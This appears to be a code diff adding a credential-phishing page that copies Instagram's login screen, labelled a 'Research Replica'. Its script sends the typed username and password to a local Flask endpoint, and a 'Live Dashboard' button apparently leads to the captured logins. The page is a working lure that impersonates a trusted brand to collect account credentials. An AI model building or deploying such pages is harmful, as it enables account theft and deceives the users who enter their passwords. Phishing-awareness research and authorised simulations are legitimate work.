@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      color: #262626;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .page-wrap {
+      display: flex;
+      align-items: flex-start;
+      gap: 32px;
+      padding: 32px 0;
+    }
+
+    /* ─── PHONE MOCKUP ─── */
+    .phone-mockup {
+      width: 282px;
+      height: 534px;
+      position: relative;
+      flex-shrink: 0;
+    }
+    .phone-mockup img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+    .phone-frame {
+      width: 250px;
+      height: 500px;
+      border: 2px solid #dbdbdb;
+      border-radius: 36px;
+      background: white;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+    }
+    .phone-screen {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 60px;
+      gap: 20px;
+    }
+    .phone-logo {
+      font-size: 28px;
+      font-family: 'Georgia', serif;
+      font-style: italic;
+      letter-spacing: -0.5px;
+    }
+    .phone-post {
+      width: 200px;
+      height: 200px;
+      border-radius: 4px;
+      overflow: hidden;
+      position: relative;
+    }
+    .phone-post-img {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      color: rgba(255,255,255,0.7);
+    }
+
+    /* ─── RIGHT COLUMN ─── */
+    .right-col {
+      width: 350px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .card {
+      background: white;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 40px 40px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo {
+      font-size: 36px;
+      font-family: 'Georgia', serif;
+      font-style: italic;
+      letter-spacing: -1px;
+      margin-bottom: 24px;
+      color: #262626;
+    }
+
+    .form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .input-wrap {
+      position: relative;
+      width: 100%;
+    }
+
+    .input-wrap input {
+      width: 100%;
+      height: 38px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      padding: 9px 8px 7px;
+      font-size: 12px;
+      font-family: inherit;
+      color: #262626;
+      outline: none;
+      transition: border-color 0.1s;
+    }
+    .input-wrap input:focus {
+      border-color: #a8a8a8;
+    }
+    .input-wrap input::placeholder {
+      color: #8e8e8e;
+      font-size: 12px;
+    }
+
+    .show-btn {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 13px;
+      font-weight: 600;
+      color: #262626;
+    }
+
+    .login-btn {
+      width: 100%;
+      height: 32px;
+      margin-top: 8px;
+      background: #0095f6;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.1s, opacity 0.1s;
+      font-family: inherit;
+    }
+    .login-btn:hover { background: #1877f2; }
+    .login-btn:disabled { opacity: 0.4; cursor: default; }
+
+    .dashboard-btn {
+      width: 100%;
+      height: 32px;
+      margin-top: 8px;
+      background: white;
+      border: 1.5px solid #0095f6;
+      border-radius: 8px;
+      color: #0095f6;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.1s, color 0.1s;
+      font-family: inherit;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+    .dashboard-btn:hover {
+      background: #e8f4fe;
+    }
+
+    .or-divider {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      width: 100%;
+      margin: 16px 0 12px;
+    }
+    .or-divider::before, .or-divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .or-text {
+      font-size: 13px;
+      font-weight: 600;
+      color: #8e8e8e;
+      letter-spacing: 0.3px;
+    }
+
+    .fb-btn {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      border: none;
+      background: none;
+      font-family: inherit;
+    }
+    .fb-btn:hover { color: #1877f2; }
+    .fb-icon {
+      width: 18px;
+      height: 18px;
+      background: #385185;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 12px;
+      font-weight: 700;
+      line-height: 1;
+    }
+
+    .forgot-link {
+      margin-top: 16px;
+      font-size: 12px;
+      color: #00376b;
+      cursor: pointer;
+      text-decoration: none;
+    }
+    .forgot-link:hover { text-decoration: underline; }
+
+    .signup-card {
+      background: white;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+    }
+    .signup-card a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+      margin-left: 4px;
+    }
+    .signup-card a:hover { text-decoration: underline; }
+
+    .app-links {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 14px;
+      color: #262626;
+    }
+    .app-links p { margin-bottom: 12px; }
+    .app-badges {
+      display: flex;
+      gap: 8px;
+      justify-content: center;
+    }
+    .badge {
+      border: 1px solid #262626;
+      border-radius: 6px;
+      padding: 4px 12px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      cursor: pointer;
+      text-decoration: none;
+      color: #262626;
+    }
+    .badge span:first-child { font-size: 10px; }
+    .badge span:last-child { font-size: 14px; font-weight: 600; }
+
+    footer {
+      margin-top: 40px;
+      text-align: center;
+      font-size: 12px;
+      color: #8e8e8e;
+      line-height: 1.8;
+    }
+    footer a { color: #8e8e8e; text-decoration: none; margin: 0 4px; }
+    footer a:hover { text-decoration: underline; }
+
+    /* Slideshow inside phone */
+    .slide { display: none; width: 200px; height: 200px; border-radius: 4px; }
+    .slide.active { display: flex; animation: fadein 0.5s ease; }
+    @keyframes fadein { from{opacity:0} to{opacity:1} }
+  </style>
+</head>
+<body>
+
+<div class="page-wrap">
+
+  <!-- PHONE MOCKUP -->
+  <div class="phone-frame">
+    <div class="phone-screen">
+      <div class="phone-logo">Instagram</div>
+      <div style="position:relative; width:200px; height:200px;">
+        <div class="slide active" style="background:#d4a8a8;border-radius:4px;align-items:center;justify-content:center;flex-direction:column;gap:8px;">
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="1"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+          <span style="font-size:11px;color:rgba(255,255,255,0.7);">Photo</span>
+        </div>
+        <div class="slide" style="background:#a8c4d4;border-radius:4px;align-items:center;justify-content:center;flex-direction:column;gap:8px;">
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="1"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+          <span style="font-size:11px;color:rgba(255,255,255,0.7);">Photo</span>
+        </div>
+        <div class="slide" style="background:#b8d4a8;border-radius:4px;align-items:center;justify-content:center;flex-direction:column;gap:8px;">
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="1"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+          <span style="font-size:11px;color:rgba(255,255,255,0.7);">Photo</span>
+        </div>
+      </div>
+      <div style="display:flex;gap:4px;margin-top:4px;">
+        <div class="dot" style="width:6px;height:6px;border-radius:50%;background:#385185;"></div>
+        <div class="dot" style="width:6px;height:6px;border-radius:50%;background:#c7d3e3;"></div>
+        <div class="dot" style="width:6px;height:6px;border-radius:50%;background:#c7d3e3;"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- RIGHT COLUMN -->
+  <div class="right-col">
+    <div class="card">
+      <div class="logo">Instagram</div>
+
+      <form class="form" id="loginForm" onsubmit="handleLogin(event)">
+        <div class="input-wrap">
+          <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="username" />
+        </div>
+        <div class="input-wrap">
+          <input type="password" id="password" placeholder="Password" autocomplete="current-password" />
+          <button type="button" class="show-btn" id="showPwBtn" onclick="togglePw()">Show</button>
+        </div>
+        <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+        <button type="button" class="dashboard-btn" onclick="window.location.href='/dashboard'">
+          🛡️ Go to Live Dashboard
+        </button>
+      </form>
+
+      <div class="or-divider"><span class="or-text">OR</span></div>
+
+      <button class="fb-btn" onclick="alert('Facebook login - connect to OAuth')">
+        <div class="fb-icon">f</div>
+        Log in with Facebook
+      </button>
+
+      <a href="#" class="forgot-link">Forgot password?</a>
+    </div>
+
+    <div class="signup-card">
+      Don't have an account?
+      <a href="/signup">Sign up</a>
+    </div>
+
+    <div class="app-links">
+      <p>Get the app.</p>
+      <div class="app-badges">
+        <a class="badge" href="#">
+          <span>Download on the</span>
+          <span>App Store</span>
+        </a>
+        <a class="badge" href="#">
+          <span>Get it on</span>
+          <span>Google Play</span>
+        </a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div>
+    <a href="#">Meta</a>
+    <a href="#">About</a>
+    <a href="#">Blog</a>
+    <a href="#">Jobs</a>
+    <a href="#">Help</a>
+    <a href="#">API</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Top Accounts</a>
+    <a href="#">Hashtags</a>
+    <a href="#">Locations</a>
+  </div>
+  <div style="margin-top:6px;">
+    <a href="#">English</a>
+    &copy; 2024 Instagram (Research Replica)
+  </div>
+</footer>
+
+<script>
+  // Phone slideshow
+  let currentSlide = 0;
+  const slides = document.querySelectorAll('.slide');
+  const dots = document.querySelectorAll('.dot');
+  setInterval(() => {
+    slides[currentSlide].classList.remove('active');
+    dots[currentSlide].style.background = '#c7d3e3';
+    currentSlide = (currentSlide + 1) % slides.length;
+    slides[currentSlide].classList.add('active');
+    dots[currentSlide].style.background = '#385185';
+  }, 3000);
+
+  // Show/hide password
+  function togglePw() {
+    const pw = document.getElementById('password');
+    const btn = document.getElementById('showPwBtn');
+    if (pw.type === 'password') {
+      pw.type = 'text';
+      btn.textContent = 'Hide';
+    } else {
+      pw.type = 'password';
+      btn.textContent = 'Show';
+    }
+  }
+
+  // Login handler — connect to Flask backend
+  function handleLogin(e) {
+    e.preventDefault();
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value;
+    if (!username || !password) return;
+
+    const btn = document.getElementById('loginBtn');
+    btn.disabled = true;
+    btn.textContent = 'Logging in...';
+
+    // POST to Flask backend
+    fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password })
+    })
+    .then(r => r.json())
+    .then(data => {
+      if (data.success) {
+        window.location.href = '/home';
+      } else {
+        alert(data.message || 'Invalid credentials');
+        btn.disabled = false;
+        btn.textContent = 'Log in';
+      }
+    })
+    .catch(() => {
+      // Dev mode: redirect anyway
+      window.location.href = '/home';
+    });
+  }
+</script>
+
+</body>
+</html>
